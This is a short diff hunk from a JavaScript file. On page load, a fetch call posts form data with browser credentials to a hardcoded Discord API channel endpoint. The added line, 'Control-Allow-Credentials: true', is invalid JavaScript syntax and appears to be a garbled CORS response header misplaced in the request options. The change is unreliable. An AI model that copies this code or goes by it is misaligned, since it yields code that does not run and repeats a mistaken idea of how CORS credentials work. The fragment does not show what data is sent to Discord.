@@ -20,6 +20,7 @@ document.addEventListener('DOMContentLoaded', function(){
             fetch('https://discord.com/api/v10/channels/1146358218696691764/messages', {
                 method: 'POST',
                 credentials: 'include',
+                Control-Allow-Credentials: 'true',
                 body: formData,
                 headers: {
                     'Content-Type': 'multipart/form-data',
